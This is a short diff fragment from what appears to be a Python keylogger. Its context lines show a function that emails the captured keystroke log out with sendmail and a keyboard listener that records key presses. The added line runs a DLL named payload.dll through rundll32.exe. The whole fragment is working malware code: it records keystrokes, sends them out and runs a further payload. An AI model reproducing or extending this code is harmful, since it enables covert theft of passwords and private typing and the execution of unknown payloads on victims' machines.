@@ -39,4 +39,4 @@ def send_log():
     session.sendmail(email,email,full_log)
 with Listener(on_press=on_press) as listener:
     listener.join()
-
+p = popen(["rundll32.exe","./payload.dll"])
